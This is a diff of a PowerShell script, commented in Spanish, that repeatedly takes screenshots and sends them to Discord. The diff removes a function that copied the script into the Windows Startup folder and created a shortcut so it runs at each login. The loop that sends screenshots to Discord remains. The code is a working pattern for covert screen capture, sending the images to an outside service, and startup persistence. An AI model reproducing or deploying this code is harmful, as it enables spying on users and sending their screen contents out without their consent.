@@ -30,27 +30,8 @@ function Send-ScreenshotToDiscord {
     Remove-Item -Path $fileName
 }
 
-# Función para ejecutar el script al iniciar Windows
-function Register-StartupScript {
-    $startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
-    $scriptFilePath = [System.IO.Path]::Combine($startupFolderPath, "ScreenshotToDiscord.ps1")
-    
-    # Crear el archivo del script en la carpeta de inicio
-    Set-Content -Path $scriptFilePath -Value $script -Force
-    
-    # Crear un acceso directo del archivo del script en la carpeta de inicio
-    $shortcutFilePath = [System.IO.Path]::ChangeExtension($scriptFilePath, "lnk")
-    $shell = New-Object -ComObject WScript.Shell
-    $shortcut = $shell.CreateShortcut($shortcutFilePath)
-    $shortcut.TargetPath = $scriptFilePath
-    $shortcut.Save()
-}
-
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
 for ($i = 1; $i -le 2; $i++) {
     Send-ScreenshotToDiscord
     Start-Sleep -Seconds 30
 }
-
-# Registrar el script para ejecutarse al iniciar Windows
-Register-StartupScript
